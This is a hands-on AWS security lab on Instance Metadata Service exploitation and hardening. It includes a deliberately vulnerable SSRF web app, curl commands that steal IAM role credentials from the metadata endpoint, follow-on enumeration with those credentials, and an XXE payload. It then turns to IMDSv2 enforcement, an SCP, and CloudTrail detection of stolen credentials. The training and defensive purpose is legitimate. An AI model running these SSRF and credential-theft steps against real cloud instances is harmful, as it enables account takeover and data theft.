# 🔗 IMDS Attack & Hardening — Metadata Service Exploitation

> **Phase 4 · Document 24 of 29**  
> **Estimated cost:** ~$0.50 · **Estimated time:** 60 minutes  
> **Prerequisites:** `22-cloudgoat-lab-setup.md`, `03-ec2-instance-lifecycle.md`  
> ⚠️ **Only against your dedicated attack account**

---

## What Is the IMDS?

The Instance Metadata Service (IMDS) is an HTTP endpoint available from inside every EC2 instance at `http://169.254.169.254`. It provides instance configuration data — including temporary IAM credentials for any role attached to the instance.

```
Inside EC2 Instance
      │
      │  HTTP GET (no auth required in IMDSv1)
      ▼
http://169.254.169.254/latest/meta-data/
      │
      ├── /instance-id
      ├── /public-ipv4
      ├── /iam/security-credentials/
      │         └── /RoleName  ← temporary IAM credentials
      └── /user-data  ← startup scripts (may contain secrets)
```

> **Why this matters:** IMDSv1 requires no authentication. Any HTTP request from inside the instance — including those triggered by SSRF vulnerabilities in web applications — can steal IAM credentials.

---

## IMDSv1 vs IMDSv2

| Feature | IMDSv1 | IMDSv2 |
|---------|--------|--------|
| Authentication | None — any HTTP GET works | Requires session token (PUT first) |
| SSRF exploitable | Yes — trivially | No — PUT requests don't follow redirects |
| Default on new instances | No (AWS changed default 2019) | Yes (recommended) |
| Hop limit | 1 (default) | 1 (default) |

---

## Part 1 — The Attack (IMDSv1)

### Step 1 — Set up a vulnerable instance

Launch an EC2 instance with IMDSv1 enabled and a web application that has SSRF:

```bash
# Launch instance with IMDSv1 explicitly enabled
aws ec2 run-instances \
  --image-id ami-xxxxxxxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=lab-ec2-s3-read-role \
  --subnet-id subnet-xxxxxxxxx \
  --security-group-ids sg-xxxxxxxxx \
  --metadata-options "HttpTokens=optional,HttpEndpoint=enabled" \
  --user-data '#!/bin/bash
yum install -y python3
cat > /home/ec2-user/ssrf_app.py << EOF
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request
from urllib.parse import urlparse, parse_qs

class SSRFHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        url = params.get("url", ["http://example.com"])[0]
        
        # VULNERABLE: fetches any URL provided by user
        try:
            response = urllib.request.urlopen(url)
            data = response.read()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

HTTPServer(("0.0.0.0", 8080), SSRFHandler).serve_forever()
EOF
python3 /home/ec2-user/ssrf_app.py &' \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=lab-ssrf-target}]'
```

---

### Step 2 — Exploit the SSRF

From your attack machine:

```bash
TARGET="http://<instance-public-ip>:8080"

# Verify SSRF works with a benign URL
curl "$TARGET?url=http://example.com"

# Step 1: Access the metadata root
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/"

# Step 2: Get instance identity
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/instance-id"
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/public-ipv4"
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/placement/availability-zone"

# Step 3: Check for IAM role
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/iam/info"

# Step 4: Get the role name
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 5: STEAL THE CREDENTIALS
ROLE_NAME=$(curl -s "$TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
curl "$TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

Output:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T14:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4lcK4w...",
  "Expiration": "2024-01-15T20:30:00Z"
}
```

---

### Step 3 — Use the Stolen Credentials

```bash
# Configure stolen credentials
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoXnyc4lcK4w...

# Confirm identity
aws sts get-caller-identity
# Returns: the EC2 instance role — you now have whatever that role can do

# Enumerate what you can do
aws s3 ls
aws ec2 describe-instances
aws iam list-users  # (if role allows)
aws secretsmanager list-secrets  # often overlooked permission

# Extract more sensitive data
curl "$TARGET?url=http://169.254.169.254/latest/user-data"
# User data scripts often contain passwords, API keys, bootstrap credentials
```

---

### Step 4 — IMDSv1 via Other SSRF Vectors

SSRF doesn't only come from web applications. Other common vectors:

```bash
# XML External Entity (XXE) in document parsing
# Inject this into an XML file uploaded to the target:
cat > xxe-payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName">
]>
<root>&xxe;</root>
EOF

# PDF generation SSRF
# Many PDF generators fetch URLs embedded in HTML
# <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName">

# Webhook/URL fetch features
# Any feature that says "fetch content from URL" is a potential SSRF vector
```

---

## Part 2 — Attempt Against IMDSv2

Try the same attack against an IMDSv2-only instance:

```bash
# Launch instance with IMDSv2 required
aws ec2 run-instances \
  --image-id ami-xxxxxxxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=lab-ec2-s3-read-role \
  --metadata-options "HttpTokens=required,HttpEndpoint=enabled,HttpPutResponseHopLimit=1"

# Try the SSRF attack against IMDSv2
TARGET_V2="http://<imdsv2-instance-ip>:8080"

# This FAILS — GET request without token returns 401
curl "$TARGET_V2?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: 401 Unauthorized

# IMDSv2 requires a PUT request first to get a session token
# SSRF exploits use GET (following HTTP redirects)
# PUT requests do NOT follow redirects → SSRF cannot get the token → attack fails

# What you would need (only works from inside the instance, not via SSRF)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

IMDSv2 stops the SSRF attack completely.

---

## Part 3 — Hardening: Enforce IMDSv2

### On a single instance

```bash
# Enforce IMDSv2 on existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxxxxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1

# Verify
aws ec2 describe-instances \
  --instance-ids i-xxxxxxxxxxxxxxxxx \
  --query 'Reservations[0].Instances[0].MetadataOptions'
```

### On all instances in the account

```bash
# Find all instances NOT using IMDSv2
aws ec2 describe-instances \
  --filters "Name=metadata-options.http-tokens,Values=optional" \
  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' \
  --output table

# Enforce IMDSv2 on all running instances
INSTANCE_IDS=$(aws ec2 describe-instances \
  --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].InstanceId' \
  --output text)

for ID in $INSTANCE_IDS; do
  echo "Enforcing IMDSv2 on $ID"
  aws ec2 modify-instance-metadata-options \
    --instance-id $ID \
    --http-tokens required \
    --http-endpoint enabled
done
```

### At account level via IAM SCP

Deny launching instances without IMDSv2:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    }
  ]
}
```

### Via AWS Config rule

```
AWS Config → Rules → Add rule
  Rule: ec2-imdsv2-check
  Managed rule by AWS
  Flags any instance where HttpTokens != required
```

---

## Part 4 — Disable IMDS Entirely

If an instance does not need to access AWS APIs (static web server, etc.), disable IMDS completely:

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxxxxxxxxxx \
  --http-endpoint disabled
```

---

## Detection — Spotting IMDS Credential Use

Credentials stolen via IMDS are temporary (STS AssumedRole credentials). They have a distinctive ARN format:

```
arn:aws:sts::ACCOUNT-ID:assumed-role/RoleName/i-xxxxxxxxxxxxxxxxx
```

The `i-xxxxxxxxxxxxxxxxx` session name is the instance ID. If you see these credentials used from an IP that is NOT the EC2 instance's public IP — the credentials were stolen.

```sql
-- In CloudTrail Logs Insights
fields eventTime, userIdentity.arn, sourceIPAddress, eventName
| filter userIdentity.type = "AssumedRole"
| filter userIdentity.arn like /assumed-role/
| parse userIdentity.arn "assumed-role/*/i-*" as roleName, instanceId
| filter ispresent(instanceId)
| sort eventTime desc
```

Cross-reference `sourceIPAddress` with the instance's known public IP. A mismatch = stolen credentials being used externally.

---

## IMDS Security Checklist

```
Instance Configuration:
  [ ] IMDSv2 enforced on all instances (HttpTokens=required)
  [ ] Hop limit set to 1 (prevents container escape to host IMDS)
  [ ] IMDS disabled on instances that don't need it

Account-Level Controls:
  [ ] SCP prevents launching instances with HttpTokens=optional
  [ ] AWS Config rule ec2-imdsv2-check enabled
  [ ] CloudWatch alarm on AssumedRole credentials used from unexpected IPs

Application Security:
  [ ] All web applications input-validated for URL parameters
  [ ] Outbound HTTP from application servers filtered (no internal IPs)
  [ ] WAF SSRF rules enabled (document 13)

Detection:
  [ ] GuardDuty enabled (detects unusual credential use)
  [ ] CloudTrail alert for AssumedRole from unexpected source IPs
```

---

## Cleanup

```bash
# Terminate the vulnerable test instances
aws ec2 terminate-instances --instance-ids <ssrf-target-id> <imdsv2-instance-id>
```

---

## Phase 4 Progress Tracker

- [x] CloudGoat lab setup
- [x] IAM privilege escalation paths
- [x] IMDS attack and hardening
- [ ] S3 misconfiguration attacks
- [ ] Pacu framework basics

---

*Phase 4 · AWS Cybersecurity & Digital Forensics Roadmap*
